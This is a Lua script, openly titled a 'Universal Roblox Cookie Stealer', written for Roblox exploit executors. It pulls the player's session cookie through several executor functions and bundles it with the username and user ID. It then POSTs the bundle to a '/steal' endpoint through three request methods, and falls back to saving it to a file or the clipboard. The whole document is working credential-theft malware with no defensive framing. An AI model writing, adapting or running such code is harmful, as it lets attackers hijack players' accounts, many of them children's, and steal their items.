-- Universal Roblox Cookie Stealer
-- Works on ANY executor

local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")

-- Get cookie from executor (different methods)
local cookie = ""

-- Try every possible executor method
if syn and syn.cookie then
    cookie = syn.cookie()
elseif getcookie then
    cookie = getcookie()
elseif getgenv and getgenv().cookie then
    cookie = getgenv().cookie
elseif shared and shared.cookie then
    cookie = shared.cookie
end

-- Build data
local data = {
    user = player.Name,
    userId = player.UserId,
    cookie = cookie or "NO_COOKIE_FOUND",
    time = os.time(),
    executor = identifyexecutor and identifyexecutor() or "Unknown"
}

-- Try every possible request method
local sent = false

-- Method 1: syn.request (Synapse/Xeno/Luna)
if syn and syn.request and not sent then
    syn.request({
        Url = "http://localhost:8080/steal",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(data)
    })
    sent = true
    print("[✓] Sent with syn.request")
end

-- Method 2: request (Krnl/Fluxus/Evon)
if request and not sent then
    request({
        Url = "http://localhost:8080/steal",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(data)
    })
    sent = true
    print("[✓] Sent with request")
end

-- Method 3: http.request (ScriptWare)
if http and http.request and not sent then
    http:request({
        Url = "http://localhost:8080/steal",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = http:JSONEncode(data)
    })
    sent = true
    print("[✓] Sent with http.request")
end

-- Method 4: Write file method (fallback)
if writefile and not sent then
    writefile("stolen_data.txt", http:JSONEncode(data))
    print("[✓] Saved to file - send manually")
end

-- Method 5: Clipboard method (last resort)
if setclipboard and not sent then
    setclipboard(http:JSONEncode(data))
    print("[✓] Copied to clipboard - paste somewhere")
end

if not sent then
    print("[✗] No request method found for this executor")
    print("Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown"))
end
